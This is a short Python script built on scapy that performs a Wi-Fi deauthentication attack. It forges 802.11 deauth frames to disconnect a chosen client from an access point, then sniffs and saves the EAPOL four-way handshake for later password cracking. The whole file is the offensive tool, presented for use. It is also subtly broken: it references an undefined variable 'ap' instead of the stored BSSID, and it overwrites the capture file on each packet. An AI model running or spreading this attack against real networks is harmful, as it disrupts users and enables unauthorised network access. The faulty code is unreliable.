import os
import sys
from scapy.layers.eap import EAPOL
from scapy.all import *


if len(sys.argv) <= 3:
        print("Missing wifi adapter, access point bssid and client bssid as arguments")
        print("Run sudo python3 deauthenticator.py <wifi adapter> <access point bssid> <client bssid>")
        sys.exit()
else:
        wifi = sys.argv[1]
        bssid = sys.argv[2]
        client = sys.argv[3]

c = 0
def handle(packet):
	global c
	if packet.haslayer(EAPOL):
		c += 1
		print("captured key",c)
		wrpcap("handshake.cap",packet)


#create the deauth packets and send them
packet = Dot11(addr1=client,addr2=ap,addr3=ap)
frame = RadioTap()/packet/Dot11Deauth(reason=7)

sendp(frame,iface=wifi,count=15,inter=0.5)

sniff(iface=wifi,prn=handle,timeout=30) # sniff the network to get the eapol keys from 4 way handshake


